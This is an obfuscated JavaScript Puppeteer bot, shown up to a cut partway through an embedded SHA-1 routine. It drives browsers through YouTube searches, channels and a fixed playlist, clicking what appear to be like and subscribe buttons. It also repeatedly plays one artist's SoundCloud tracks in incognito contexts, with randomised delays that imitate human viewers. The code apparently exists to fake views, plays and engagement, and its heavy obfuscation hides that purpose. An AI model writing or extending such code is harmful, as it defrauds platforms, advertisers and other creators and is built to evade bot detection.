const V = b,
  U = c,
  T = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1ad5 + 0x3f5 * -0x1 + 0x493 * -0x5))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x24c1 * 0x1 + 0xb5e * -0x1 + -0x1 * -0x301f), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xd3d2 + 0x2 * 0x53d5 + -0x1064c + (0x3f3 * 0x12 + -0x2 * 0x17 + 0x4 * -0x314) * random()) : await standardWaitForNetIdle(f), await wait(0x3dc * 0x1 + -0x1fba + 0x2f66 + (0x2b96 + -0xb * 0x356 + -0x11c * -0x1d) * random()), -0x78b * -0x2 + -0x1 * 0x24a5 + -0x28 * -0x8a;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1074 + -0x170b + 0x1a1f), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x23a2 + 0x4aa + -0x284b;
}
async function randomWait() {
  return await wait(-0x11b6 + -0x190c + -0x1d5 * -0x22 + (-0x39 * -0x8b + 0x5c * -0x30 + 0x5d5) * random()), 0x376 * 0x1 + 0xab0 + -0xd5 * 0x11;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2135 + -0x1 * -0x1ae + 0x2af * -0xd, 0x1717 + 0x222b + -0x393b), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x7f * 0x316 + -0x17e57 + 0x3f0a1) * getRandomInt(-0x23bf + 0xb * 0x1b1 + 0x1126, -0x1c7b * -0x1 + -0x1647 + -0x62f), h)), 0x1af2 + 0x35 * 0xa1 + 0x2 * -0x1e23;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x14ad + -0x1a * -0x1a + -0x1751;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x98 * -0x2f + 0x2d8 + 0x117 * 0x17]['split']('\x20');
    for (let k = 0x655 + -0x2077 * 0x1 + -0x1be * -0xf; k < i['length']; k += -0x8f9 + 0x959 * -0x2 + -0x221 * -0xd)
      j += i[k] * h[i[k + (-0xaaf * -0x1 + -0x1 * -0x214f + -0x1 * 0x2bfd)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1430 + -0x1 * -0x1906 + 0x1698 * -0x2)['map'](l => Array['from'](l['children']))['flat'](-0x32c + 0x621 + -0x7 * 0x6c)['map'](l => l['childNodes'][0x16ca + -0x1d9f + -0x23 * -0x32]['childNodes'][-0x1499 * 0x1 + -0x5c5 * -0x1 + 0x1 * 0xed4]['childNodes'][0xaca + 0x5de * 0x1 + 0x1d * -0x93]['childNodes'][-0x16ca + -0x1e50 + 0x2 * 0x1a8d]['childNodes'][0xeec + 0x3e5 * 0xa + 0x35dd * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x24af + -0x1ea2 + -0x225, 0x3 * -0x269 + 0x1f * -0xf2 + -0x1cf * -0x1f)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1e9e + -0x34e6 * 0x1 + 0x8e1c);
  const h = await getMaxTime(f),
    i = Math['min']((-0x3655 * -0x1 + -0x1a227 * 0x1 + 0x25632) * getRandomInt(0x12fa + -0x4a8 + 0x394 * -0x4, -0x1 * -0x1a23 + 0x2 * -0x31a + -0x13ea), h);
  return await wait(i), 0x6cd + -0x9ef + 0x323 * 0x1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1 * 0xfe0 + -0x25c2 + 0x15e2]['children'][-0x2 * 0xb9e + 0x1 * 0x1bff + -0x35 * 0x17]['children'][0x2 * 0x100d + -0xf38 + 0x10e2 * -0x1]['children'][0x442 * -0x5 + -0x1dcd + 0x3317]['children'][0x58 * -0x43 + 0xecd + 0x2b * 0x31]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2648 + 0x1fb3 + -0x2 * -0x34b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x9d * 0x5 + -0x1b9a + 0x18ed + (0x13d * 0xa + 0x216c + -0x8b * 0x54) * random()
  }), await wait(0x1 * -0x77a + 0x266b * 0x1 + -0x1 * 0x1cfd + (-0x1e72 + -0xcfe + 0x2c9c) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1922 + -0xc86 + 0x25aa * 0x1]['childNodes'][-0x15cd + -0x23 * -0xc7 + 0x1cd * -0x3]['childNodes'][-0x2138 * -0x1 + 0x1270 + 0x1 * -0x33a7]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x619 + 0x4f * -0x74 + 0x122 * 0x25]['childNodes'][0x586 + -0x19e9 + 0x133 * 0x11]['childNodes'][-0x115 * 0x7 + 0x2627 + 0xf49 * -0x2]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xc52 + 0x879 + 0x377 * -0x6),
          r = 0x1e88 + 0x16e0 + -0x3568;
        for (let u = 0xf4 + -0x2062 + -0x12 * -0x1bf; u < q['length']; u += 0x176c * 0x1 + -0x1599 + -0xf * 0x1f)
          r += q[u] * k[q[u + (-0x8 * -0x375 + 0x2433 + -0x3fda)]];
        return r;
      }(n);
  });
  await wait((-0x3db4 + 0x66fe + -0xa * -0x1bb) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1b79 * -0x1 + 0x1a223 + 0x34cf * -0x4) * getRandomInt(0x850 + 0x3a4 * -0x7 + 0x112d, -0x8a5 * -0x1 + 0x1 * 0x12ca + -0x1b65), h + (0x7 * 0x347 + 0x1 * 0x189 + 0xd3 * -0x6));
  return await wait(i), 0xb * -0x95 + -0x1 * -0x143e + -0x6eb * 0x2;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1625 + 0x69 + 0x15bc);
    let h = e[f];
    if (c['lKKPec'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xaae * 0x1 + -0xa * 0x20e + 0x2 * 0x4ef, r, s, t = 0xcab + 0x1105 + -0x1db0; s = m['charAt'](t++); ~s && (r = q % (0x1ad5 + 0x3f5 * -0x1 + 0xd1 * -0x1c) ? r * (-0x24c1 * 0x1 + 0xb5e * -0x1 + -0x1 * -0x305f) + s : s, q++ % (0x234e + 0x7 * 0x3fe + -0x3f3c)) ? o += String['fromCharCode'](0x2a2 * 0x9 + -0x3 * 0x5 + 0xc * -0x1e3 & r >> (-(0x3dc * 0x1 + -0x1fba + 0x1be0) * q & 0x15cb + -0x7 * 0x29f + -0xdb * 0x4)) : -0x78b * -0x2 + -0x1 * 0x24a5 + -0x1 * -0x158f) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1074 + -0x170b + 0x697, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x23a2 + 0x4aa + -0x283c))['slice'](-(-0x11b6 + -0x190c + -0x187 * -0x1c));
        }
        return decodeURIComponent(p);
      };
      c['NVYtER'] = i, b = arguments, c['lKKPec'] = !![];
    }
    const j = e[-0x39 * -0x8b + 0x5c * -0x30 + -0xdb3],
      k = f + j,
      l = b[k];
    return !l ? (h = c['NVYtER'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x287 * 0x3 + -0x1f * 0x141 + 0x3df * 0xc), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x12ad + 0x7 * -0x449 + 0x3c64 + (-0x19b1 + -0x959 * -0x4 + -0x1 * 0x7cb) * Math['random']());
    });
  }, 0x36f + 0x1 * 0x1d35 + -0x54c);
  await wait(-0x36ec2 + 0x4b131 + -0x1 * -0x35171);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x19100 + -0x7774 + -0x2f2c) * getRandomInt(-0x200d + -0x29 * -0x47 + -0x6e6 * -0x3, 0x1747 + -0x1 * 0x36f + -0x13bf)), clearInterval(h), -0xf * -0x146 + 0x17d + -0x1496;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * 0x1d41 + 0x4a8 + -0x1 * -0x1899;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x3 * -0xb39 + -0x767 * 0x5 + 0x359;
    await randomWait();
  }
  return -0x4 * 0xb7 + -0x6af * -0x2 + -0xa81 * 0x1;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1836 + -0xab7 * -0x3 + -0x385b + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x2 * 0x10 + -0x269e * 0x1 + 0x26be + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x23e5 + -0x5d5 * 0x5 + -0x6bc + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xea3 + 0x9e * 0x3e + -0x17a1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const R = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + R(0xe) + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x3 * -0x21b + -0x79b3 + 0x12fcc + getRandomInt(-0xf9 * -0x6 + -0x8 * 0x324 + 0x2 * 0x26f1, -0x2271 + -0x98d2 + 0x13073 * 0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x298 * 0xa + 0x63 * 0x3d + 0x2b * 0xe), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xfb * 0x15 + -0x19a6 + 0x2e3d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x2 * -0x905 + 0x1baf + -0x9a5, 0x1 * -0x130d + -0x1db6 + 0x30f5)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x233e + 0x6 * 0x56f + -0x3c08 + floor((0x1b86 + -0xdc3 + -0x9db * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x32b51114 + 0x4 * 0x242cf3a5 + -0x8 * -0x4402850),
          -0x26 * 0x37885 + 0x83c09e + 0x802320,
          0x45 * 0x373 + -0xee0 + -0x5f1f,
          -0x6de * -0x5 + 0x1 * -0xc2a + -0x15ac
        ], y = [
          0x227b + -0x1b2d + -0x736,
          0x2236 + 0x22d3 + 0x44f9 * -0x1,
          0x1 * 0x89b + 0x21f1 * 0x1 + -0x2a84,
          -0x1049 + 0x14 * -0x18d + 0x2f4d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x105e + 0x8 * -0x4b8 + 0x4b * 0x49)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x726 + -0x1 * -0x1af0 + 0x2216 * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x10f + 0x1 * -0x1058 + 0xf49) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const S = d;
              J ? (A[-0x4 * -0x49b + -0x3 * 0xb03 + 0x1 * 0xe9d] = A[0x2 * 0x263 + 0x1361 + -0x1817] = A[-0x1 * 0xe09 + -0x1cfb * -0x1 + -0xef1] = A[0xb61 + 0xa34 + -0x1593] = A[-0x3df * -0x1 + 0x23d2 + -0x2 * 0x13d7] = A[-0x1b37 + -0x9ee + 0x2529] = A[0x1 * -0x208f + 0x1d23 + -0x371 * -0x1] = A[0x2 * -0x42a + 0x671 * -0x6 + 0x2f00] = A[-0x1af9 + -0x5c5 * 0x5 + 0x37d9] = A[-0x21fa + 0x1 * -0x163d + 0x383f] = A[0xc26 + -0x7b9 + -0x464] = A[0x448 + 0x7 * -0xd + -0x1 * 0x3e3] = A[0x1 * -0x188f + 0x1181 * 0x1 + 0x719] = A[0xbda + 0x1 * 0x16c9 + -0x6eb * 0x5] = A[0x1c2e + -0x1d68 * 0x1 + 0x6d * 0x3] = A[-0x1 * 0x761 + -0x3b * -0x89 + -0x1824] = A[0xb24 + -0x1b79 * 0x1 + 0x1064] = -0x17a8 + -0xfd6 * 0x1 + 0x277e, this['blocks'] = A) : this['blocks'] = [
                -0x1071 + -0x1ab6 + -0x2b27 * -0x1,
                -0x6 * 0x45a + -0x1 * -0xcca + -0x37 * -0x3e,
                -0x17e7 + -0x7 * -0x47 + 0x15f6,
                0xe4c + 0xf89 * -0x1 + 0x1 * 0x13d,
                -0x4aa + -0x8ec + 0x5e * 0x25,
                -0x7c9 * 0x2 + 0x61 * 0x32 + -0x360,
                0xf6d + 0x1 * 0x21af + 0x2 * -0x188e,
                -0x4 * -0x2f9 + 0x2169 + -0x1 * 0x2d4d,
                -0x10e7 * -0x1 + -0x1fd7 + 0xef0,
                0x13f3 + -0x11 * -0x1b2 + -0x30c5,
                -0x12 * -0x3b + 0x17f * 0x16 + -0x2510,
                0x6c3 * -0x1 + -0x7 * -0x439 + -0x16cc,
                -0x43 * -0x79 + 0x233 * -0x2 + 0x1b45 * -0x1,
                -0xf6b * 0x2 + -0xc95 + 0x2b6b,
                0x18ff + 0x12e * 0x1f + -0x3d91,
                -0x1 * -0x1e62 + 0xd58 + 0x2bba * -0x1,
                -0x14f1 + -0x1 * -0x6a2 + 0x1 * 0xe4f
              ], this['h0'] = 0x580beaa + 0x67d6828f + 0x5 * -0x136d2d8, this['h1'] = -0x1bcc76e6 * 0xf + 0x26fb80a * -0xd + -0x1f5 * -0x15fc951, this['h2'] = -0xe5 * 0x1812d9 + 0xf1a6f8aa + -0x43633f8f, this['h3'] = 0x3626 * -0x9080 + 0x2ff * -0xa497d + 0x4d94f4f9, this['h4'] = -0x144cb78c8 + -0x30be16fb + 0x8f * 0x3fb469d, this['block'] = this['start'] = this['bytes'] = this[S(0x13)] = 0xa3 * 0x1 + -0x1e29 + -0xec3 * -0x2, this['finalized'] = this['hashed'] = -0x18f * -0x4 + 0x25f4 + -0x2c30, this['first'] = 0x543 + 0x4aa + -0x9ec;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0xca5 + -0x1 * 0xcf1 + -0x1 * -0x4c, O = J['length'] || -0x2 * 0x12be + -0x474 + 0x29f0, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xaa6 * 0x2 + -0x1 * -0x26aa + 0x1ee * -0x9, P[-0x9 * -0x2e3 + 0x11a9 + 0xc * -0x3a3] = this['block'], P[0x1993 + 0x17 * 0x101 + -0x309a] = P[0x10ff + -0x11ea * -0x1 + 0x22e8 * -0x1] = P[0x20c9 + 0x1018 + -0x30df] = P[0x4 * 0x7d2 + -0x2 * -0x6a1 + -0x1 * 0x2c87] = P[0x1ad2 + 0x5 * 0x655 + -0x3a77] = P[-0x1 * -0x25bd + 0x2bd * -0x2 + -0x203e] = P[0x1 * 0x1b37 + 0x55d * -0x2 + -0x34b * 0x5] = P[-0x2 * 0x897 + 0xed4 + 0x261] = P[-0xee * -0x4 + 0x316 + -0x6c6] = P[-0x137c + -0x67 * 0x5c + 0x3889] = P[0x4fd * -0x3 + -0x1b8f + 0x2a90] = P[-0x19ce + 0x1e34 + -0x45b] = P[0xbeb * 0x1 + -0x14e * -0x17 + 0x1 * -0x29e1] = P[0x1ef6 + -0x100 * -0x13 + -0x31e9] = P[-0x1362 + 0x443 + 0xf2d] = P[-0xd77 + -0x1d25 * -0x1 + 0x1f * -0x81] = -0x2 * 0x55c + -0x1 * 0x971 + 0x1429), K) {
                    for (N = this['start']; M < O && N < -0x1d0a + 0x31e * -0x3 + 0x9a9 * 0x4; ++M)
                      P[N >> 0x33 * 0xbb + -0x28 * -0x67 + -0x3557] |= J[M] << y[-0x778 + -0x1 * 0x185 + 0x18 * 0x60 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1e22 + 0xbd3 + 0x1 * 0x128f; ++M)
                      (L = J['charCodeAt'](M)) < -0x15d1 + -0x4c5 + 0x1b16 * 0x1 ? P[N >> -0x40 * 0x3d + 0x3a9 * 0x3 + -0x5 * -0xdb] |= L << y[-0x918 + 0x22b * -0x9 + -0x1c9e * -0x1 & N++] : L < -0x14b + -0x21e * -0x2 + 0x50f ? (P[N >> -0x1efc + -0x2 * 0x171 + 0x10f0 * 0x2] |= (0x91a + 0x1278 + -0x1ad2 | L >> 0x15a8 + -0x9bd * 0x3 + 0x287 * 0x3) << y[0x1f * 0x6f + -0x2 * 0x36d + -0x694 & N++], P[N >> -0xffd * -0x2 + -0x1 * 0xe91 + 0x51 * -0x37] |= (0x1 * -0x11fb + 0x2 * 0x47 + 0x11ed | 0xe8 + 0x16b3 + -0x175c & L) << y[0x1fb5 * -0x1 + 0x60f * -0x3 + -0x1 * -0x31e5 & N++]) : L < 0x4f54 + -0x15 * 0x129d + 0x20f8d || L >= -0x3bd7 + -0x62eb + 0x123a * 0x15 ? (P[N >> 0x27 * -0x3b + 0x2161 + -0x1862] |= (-0x8 * 0x3 + -0xdea + 0xfe * 0xf | L >> 0x181e + 0x2653 + -0x1 * 0x3e65) << y[-0xd74 + -0x1dd6 + -0x8a9 * -0x5 & N++], P[N >> 0x23c1 + 0x57 * -0x3 + -0x22ba] |= (0x1203 * 0x1 + -0x3c * -0x35 + -0x1def | L >> -0x2592 + 0x5 * -0xd7 + -0x1 * -0x29cb & 0x1fcb + 0x2371 * 0x1 + -0x42fd * 0x1) << y[0x22d * 0xd + 0x3b + -0x1 * 0x1c81 & N++], P[N >> -0x1 * -0x1265 + -0x76c + 0x7 * -0x191] |= (0x237a + 0x12f6 + -0x35f0 | 0x1d4a + 0x1122 + -0x2e2d & L) << y[0x182c + -0x59 * 0x67 + 0xba6 & N++]) : (L = -0x5 * -0x1e07 + -0x1 * -0x151f9 + 0x2e6c * -0x5 + ((0x1 * -0x1bb3 + 0x1 * -0xbd4 + 0x2b86 & L) << 0xe1a + 0xca6 + -0x1ab6 | -0x95d * -0x2 + -0x1 * -0x10a2 + -0x1 * 0x1f5d & J['charCodeAt'](++M)), P[N >> 0xb52 + 0x161f * -0x1 + 0xacf * 0x1] |= (-0x2133 * -0x1 + -0xd45 * -0x2 + -0x3acd | L >> 0x2a * -0x26 + -0x1a21 + 0x206f) << y[-0x1075 * 0x2 + -0xa96 + -0x2b83 * -0x1 & N++], P[N >> -0x3d8 + -0x9e * 0x1a + -0x12 * -0x11b] |= (-0x1170 + -0x6e1 + 0x18d1 | L >> 0xa6 + -0x1dbd + 0x1d23 & 0x766 + -0x432 + -0x2f5) << y[-0x13e6 + 0x89c + 0xb4d & N++], P[N >> -0x1 * 0x47a + 0x1389 + 0x1 * -0xf0d] |= (0xb84 + -0x75f * 0x1 + -0x3 * 0x137 | L >> -0x2b * -0xd5 + 0x9c7 * -0x1 + 0x10a * -0x19 & -0x1de6 * -0x1 + 0xe4f + -0x2bf6) << y[-0x5b5 + 0x23d3 + -0x3 * 0xa09 & N++], P[N >> 0x49a + -0x3d * 0x1f + 0x2cb] |= (-0x4c * -0x6b + 0xaf1 * 0x1 + -0x2a35 | -0x1 * 0xb52 + -0x18b0 + 0x2441 & L) << y[-0x1 * 0x21ad + -0x3 * -0xcbb + 0x481 * -0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x4c4 * 0x7 + -0x6 * -0x5f3 + -0x44ce ? (this['block'] = P[0x167 * -0x6 + 0x9 * -0x44f + 0x2f41], this['start'] = N - (0x33e + 0x1 * 0x165b + -0x1959), this['hash'](), this['hashed'] = 0x1566 + -0x1a7e * -0x1 + -0x2fe3) : this['start'] = N;
                }
                return this['bytes'] > 0x16d * -0xb4417f + -0x13 * 0x1ab1d43d + 0x3fc342299 && (this['hBytes'] += this['bytes'] / (-0x1b89b290 + -0x76a4 * -0x30797 + -0x4be6c42c) << -0x417 + -0x25c8 + -0xdf5 * -0x3, this['bytes'] = this['bytes'] % (-0xdef8d954 + -0x3adc5e88 * 0x7 + 0x37aff6f0c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x251e + -0x68 * 0x30 + -0xd * -0x45b;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1984 + -0x2433 + 0xabf] = this['block'], J[K >> 0xedb + 0x13c + 0x1015 * -0x1] |= x[-0x3 * 0xaf4 + -0x1a25 + 0x3b04 & K], this['block'] = J[-0xb03 * -0x3 + 0x21e9 + 0x4c7 * -0xe], K >= 0xa5b + 0x246b + -0x76 * 0x65 && (this['hashed'] || this['hash'](), J[-0x13af + 0x1 * -0x225e + -0x65 * -0x89] = this['block'], J[-0x198a + 0x5f7 * 0x3 + 0x7b5] = J[-0x2d * -0xb + 0x19ec + 0x2c9 * -0xa] = J[0x2449 * -0x1 + -0x860 + 0x2cab] = J[0x62f * 0x5 + -0xcb9 * -0x1 + -0x2ba1] = J[0xe01 + 0xb * -0x151 + -0x6 * -0x15] = J[0x22a7 + -0x11 * 0x15d + 0x1a3 * -0x7] = J[-0xbc5 * -0x1 + 0x6 * -0x4f2 + 0x11ed * 0x1] = J[-0x21b9 + -0x247f * 0x1 + 0x463f] = J[-0x3 * -0x390 + -0x805 * 0x3 + -0x2f * -0x49] = J[0x14ca + 0x1 * -0xa83 + -0xa3e] = J[0x1f76 * 0x1 + -0xf62 * -0x1 + -0x2ece] = J[0xcb6 + -0x1c9 * 0x1 + -0xae2] = J[0x108d * -0x2 + -0x2 * -0xc1 + -0xb4 * -0x2d] = J[0x69 + -0xd38 + -0x66e * -0x2] = J[0x3f + -0x1 * 0x127a + -0x97 * -0x1f] = J[0x24e2 * 0x1 + 0x1 * -0x1db3 + -0x8 * 0xe4] = -0x1359 + 0x1249 + 0x8 * 0x22), J[-0xbc0 + 0x9ba + 0x214] = this['hBytes'] << 0x1c3c + 0x5c * -0x43 + -0x425 * 0x1 | this['bytes'] >>> -0x16ea + -0x31a * 0x1 + 0x1 * 0x1a21, J[0xa * 0x394 + 0x1d * 0x93 + 0x68c * -0x8] = this['bytes'] << -0x498 + -0xe10 + 0x12ab * 0x1, this['hash']();
